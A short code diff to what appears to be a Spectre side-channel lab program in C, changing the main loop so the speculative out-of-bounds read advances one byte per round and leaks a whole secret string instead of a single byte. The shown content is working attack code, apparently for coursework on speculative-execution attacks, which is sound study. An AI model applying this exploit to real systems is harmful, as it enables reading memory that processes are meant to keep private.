@@ -77,7 +77,7 @@
   }
 
   int main() {
-    int i;
+    int i,x=0;
     uint8_t s;
     size_t index_beyond = (size_t)(secret - (char*)buffer);
     printf("%d",*(secret+16));
@@ -89,7 +89,7 @@
       for(i=0;i<256; i++) scores[i]=0;
       for (i = 0; i < 1000; i++) {
         //printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
-        spectreAttack(index_beyond);
+        spectreAttack(index_beyond+x);
         usleep(10);
         reloadSideChannelImproved();
       }
@@ -105,6 +105,7 @@
       if (max == 0) {
         break;
       }
+      x++;
     }
     return (0); 
   }
